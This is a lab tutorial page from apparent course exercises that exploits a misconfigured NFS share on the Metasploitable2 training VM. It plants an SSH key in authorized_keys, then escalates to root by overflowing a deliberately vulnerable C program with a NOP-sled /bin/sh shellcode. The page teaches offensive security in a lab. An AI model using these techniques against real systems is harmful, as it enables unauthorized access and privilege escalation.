...
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    ...
    <title>Tutorial: NFS Share exploit - Shellcode &#8212; Exercises 2022 documentation</title>
    ...
    <link rel="next" title="Tutorial: Heap overflow exploit - Function pointers" href="heapoverflow.html" />
    <link rel="prev" title="Tutorial: ByPassing ASLR - Stack Stethoscope" href="stackstethoscope.html" />
...
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial:  NFS Share exploit - Shellcode</a><ul>
...
<li><a class="reference internal" href="#">Tutorial:  NFS Share exploit - Shellcode</a><ul>
...
<g>
  ...
  <div class="section" id="tutorial-nfs-share-exploit-shellcode">
<h1>Tutorial:  NFS Share exploit - Shellcode<a class="headerlink" href="#tutorial-nfs-share-exploit-shellcode" title="Permalink to this headline">¶</a></h1>
<div class="section" id="prerequisite">
<h2>Prerequisite<a class="headerlink" href="#prerequisite" title="Permalink to this headline">¶</a></h2>
<p>Download the vulnerable VM:</p>
<ul class="simple">
<li><a class="reference external" href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download">link</a></li>
</ul>
<p>Also configure your VM network with bridge access.</p>
<p>To install it in VirtualBox follow:</p>
<ul class="simple">
<li><a class="reference external" href="https://www.gladir.com/SOFTWARE/VIRTUALBOX/comment-ouvrir-un-fichier-vmdk-existant-dans-virtualbox.htm">https://www.gladir.com/SOFTWARE/VIRTUALBOX/comment-ouvrir-un-fichier-vmdk-existant-dans-virtualbox.htm</a></li>
</ul>
<p>Connection:</p>
...
<tbody valign="top">
<tr class="row-even"><td>msfadmin</td>
<td>msfadmin</td>
</tr>
</tbody>
</table>
<p>Last note: put belgian keyboard:</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">setxkbmap</span> <span class="pre">be</span></code> (for graphical interface)</li>
<li><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">loadkeys</span> <span class="pre">be</span></code> (<strong>for linux terminal</strong>)</li>
</ul>
</div>
<div class="section" id="exercise">
<h2>Exercise<a class="headerlink" href="#exercise" title="Permalink to this headline">¶</a></h2>
<div class="line-block">
<div class="line">NFS stands for “Network File System” and allow the storage and
...
data and files in the same way they are accessed locally.</div>
</div>
<div class="line-block">
<div class="line">NFS uses TCP/UDP on <strong>port 2049</strong> for sharing any file/directories.
<a class="footnote-reference" href="#id2" id="id1">[1]</a></div>
</div>
<div class="line-block">
<div class="line">The NFS share vulnerability is caused by misconfigured NFS setup which
basically consist in 3 main files. See
<a class="reference external" href="https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a>
for more technical reason on this.</div>
</div>
<p>Let’s start this tutorial:</p>
<ul>
<li><p class="first">(<strong>On NFS server</strong>)</p>
<ol class="arabic simple">
<li>Put <code class="docutils literal notranslate"><span class="pre">ifconfig</span> <span class="pre">-a</span></code> to get your IP address &lt;X&gt;</li>
</ol>
</li>
<li><div class="first line-block">
<div class="line">(<strong>On kali: terminal 1</strong>)</div>
</div>
<ol class="arabic simple">
<li>With <code class="docutils literal notranslate"><span class="pre">nmap</span></code> which allow to make some scan on IP address</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">-sV</span> <span class="pre">&lt;X&gt;</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/1-nmap.PNG"><img alt="../_images/1-nmap.PNG" class="sol-img align-center" src="../_images/1-nmap.PNG" style="width: 588.6px; height: 319.2px;" /></a>
<ol class="arabic" start="2">
<li><div class="first line-block">
<div class="line">Show the mount information of NFS server with</div>
</div>
</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">showmount</span> <span class="pre">-e</span> <span class="pre">&lt;x&gt;</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/2-showmount.PNG"><img alt="../_images/2-showmount.PNG" class="sol-img align-center" src="../_images/2-showmount.PNG" style="width: 226.79999999999998px; height: 31.2px;" /></a>
<ol class="arabic" start="3">
<li><div class="first line-block">
<div class="line">Create a temporary folder to mount it and mount it:</div>
</div>
</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">mkdir</span> <span class="pre">/tmp/nfssharevuln</span></code></strong></p><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">mount</span> <span class="pre">-t</span> <span class="pre">nfs</span> <span class="pre">&lt;x&gt;:/</span> <span class="pre">/tmp/nfssharevuln</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/3-mount.PNG"><img alt="../_images/3-mount.PNG" class="sol-img align-center" src="../_images/3-mount.PNG" style="width: 322.8px; height: 96.0px;" /></a>
<ol class="arabic" start="4">
<li><div class="first line-block">
<div class="line">Go in the msfadmin folder with:</div>
</div>
</li>
</ol>
<a class="sol-img reference internal image-reference" href="../_images/5-shh.PNG"><img alt="../_images/5-shh.PNG" class="sol-img align-center" src="../_images/5-shh.PNG" style="width: 282.59999999999997px; height: 79.2px;" /></a>
</li>
<li><div class="first line-block">
<div class="line">(<strong>On kali: terminal 2</strong>)</div>
</div>
<ol class="arabic simple">
<li>To do the exploit, now generate a ssh key with</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">ssh-keygen</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/6-key.PNG"><img alt="../_images/6-key.PNG" class="sol-img align-center" src="../_images/6-key.PNG" style="width: 382.8px; height: 203.4px;" /></a>
<ol class="arabic" start="2">
<li><div class="first line-block">
<div class="line">And print the result of <code class="docutils literal notranslate"><span class="pre">nfssharevuln_rsa</span></code></div>
</div>
</li>
</ol>
<a class="sol-img reference internal image-reference" href="../_images/7-catrsa.PNG"><img alt="../_images/7-catrsa.PNG" class="sol-img align-center" src="../_images/7-catrsa.PNG" style="width: 561.6px; height: 60.599999999999994px;" /></a>
</li>
<li><div class="first line-block">
<div class="line">(<strong>On kali: terminal 1</strong>)</div>
</div>
<ol class="arabic simple">
<li>Now back on our first terminal, put the content of your key in the
<code class="docutils literal notranslate"><span class="pre">authorized_keys</span></code> file of the <code class="docutils literal notranslate"><span class="pre">.ssh</span></code> folder.</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">ssh-rsa</span> <span class="pre">&lt;key&gt;</span> <span class="pre">&gt;&gt;</span> <span class="pre">authorized_keys</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/8-echo.PNG"><img alt="../_images/8-echo.PNG" class="sol-img align-center" src="../_images/8-echo.PNG" style="width: 559.8px; height: 61.199999999999996px;" /></a>
<ol class="arabic" start="2">
<li><div class="first line-block">
<div class="line">Finally connect to the NFS with ssh:</div>
</div>
</li>
</ol>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">-i</span> <span class="pre">nfssharevuln_rsa</span>&#160; <span class="pre">msfadmin&#64;&lt;x&gt;</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/9-connectionssh.PNG"><img alt="../_images/9-connectionssh.PNG" class="sol-img align-center" src="../_images/9-connectionssh.PNG" style="width: 379.2px; height: 215.4px;" /></a>
</li>
<li><div class="first line-block">
<div class="line">(<strong>ssh:/home/msfadmin</strong>)</div>
</div>
<ol class="arabic">
<li><div class="first line-block">
<div class="line">Once done, we will now try to get all privileges, one could do
that with <code class="docutils literal notranslate"><span class="pre">setuid()</span></code> exploit for example. Here we will do that
with buffer overflow coupled with shellcode.</div>
<div class="line">To do so, write a vulnerable code, such as:</div>
</div>
...
<span class="n">void</span> <span class="n">reply</span><span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">);</span>
...
<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Usage: ./echo-prompt &lt;arg1&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">else</span>          <span class="n">reply</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>You can use another code of course.</p>
</li>
<li><p class="first">And compile it without any protection since you want to exploit
it:</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-g</span> <span class="pre">-fno-stack-protector</span> <span class="pre">-z</span> <span class="pre">execstack</span> <span class="pre">vulnerable.c</span> <span class="pre">-o</span> <span class="pre">vulnerable_file</span></code></strong></p><p>We also need to disable ASLR with</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">/proc/sys/kernel/randomize_va_space</span> <span class="pre">//</span> <span class="pre">put</span> <span class="pre">0</span></code></strong></p></li>
<li><p class="first">Everything is now ready, perform the buffer overflow and inject
the shellcode to become root: (all calculation step for this part
is skipped, but the following one work for me)</p>
<div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span>./vulnerable_file  `perl -e &#39;print &quot;\x90&quot;x220 .
...
<a class="sol-img reference internal image-reference" href="../_images/12-noroot.PNG"><img alt="../_images/12-noroot.PNG" class="sol-img align-center" src="../_images/12-noroot.PNG" style="width: 555.6px; height: 106.8px;" /></a>
<br><div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span>sudo ./vulnerable_file  `perl -e &#39;print &quot;\x90&quot;x220 .
    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89
    \xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;
    . &quot;\x90\xf1\xff\xbf&quot;&#39;`
</pre></div>
</div>
<a class="sol-img reference internal image-reference" href="../_images/14-root.PNG"><img alt="../_images/14-root.PNG" class="sol-img align-center" src="../_images/14-root.PNG" style="width: 558.0px; height: 127.8px;" /></a>
<div class="line-block">
<div class="line">Everything is done, we are now connect as root !</div>
</div>
</li>
</ol>
</li>
...
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id1">[1]</a></td><td><a class="reference external" href="https://www.techopedia.com/definition/1845/network-file-system-nfs">https://www.techopedia.com/definition/1845/network-file-system-nfs</a></td></tr>
</tbody>
</table>
</div>
</div>
